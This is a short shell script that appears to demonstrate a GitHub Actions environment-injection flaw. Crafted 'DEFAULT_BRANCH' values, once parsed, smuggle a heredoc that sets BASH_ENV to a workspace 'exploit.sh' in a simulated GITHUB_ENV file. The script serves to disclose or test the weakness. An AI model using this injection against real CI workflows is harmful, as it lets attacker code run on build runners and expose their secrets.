cat << 'INIT' > dummy_init.sh
# export DEFAULT_BRANCH=A=
# export DEFAULT_BRANCH=A=BASH_ENV<<END_ENV
# export DEFAULT_BRANCH=A=\$GITHUB_WORKSPACE/exploit.sh
# export DEFAULT_BRANCH=A=END_ENV
INIT

DEFAULT_BRANCH=$(grep "export DEFAULT_BRANCH" dummy_init.sh | \
  awk 'BEGIN{FS="="} {print $3}' | sed s'/[\"}]//g')

echo "Resulting DEFAULT_BRANCH:"
echo "${DEFAULT_BRANCH}"

echo "Simulating GITHUB_ENV append:"
echo "DEFAULT_BRANCH=${DEFAULT_BRANCH}" > simulated_github_env
echo "--- content of simulated_github_env ---"
cat simulated_github_env
